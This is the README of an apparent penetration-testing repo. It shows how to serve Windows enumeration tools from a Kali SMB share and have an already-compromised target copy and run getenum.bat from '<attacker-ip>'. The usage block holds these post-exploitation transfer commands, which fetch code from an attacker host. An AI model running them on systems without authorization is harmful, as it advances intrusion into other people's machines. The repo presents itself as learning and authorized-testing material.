# getenum
Windows - upload enumeration tools to target <br>
NOTE: tools are current a/o 26 April 2022

<br><hr>

## USAGE

USE OF THIS TOOL ASSUMES SHELL ACCESS ON A TARGET WINDOWS MACHINE
<br>

```
# ON KALI
impacket-smbserver -smb2support share ../getenum

# ON TARGET WINDOWS SHELL
mkdir c:\tmp
cd c:;\tmp

copy \\<attacker-ip>\share\getenum.bat

.\getenum.bat attacker-ip
```

<br><hr>

## HAPPENINGS

THE BATCH SCRIPT WILL CREATE C:\tmp\Enum <br>
... WILL USE SMB TO COPY FILES TO WINDOWS <br>
... USE README.txt (in Enum) TO SEE COMMANDS <br>

## DISCLAIMER

All tools included in this repo are intended for learning purposes only and are to only be used on target systems with permission of the system owner.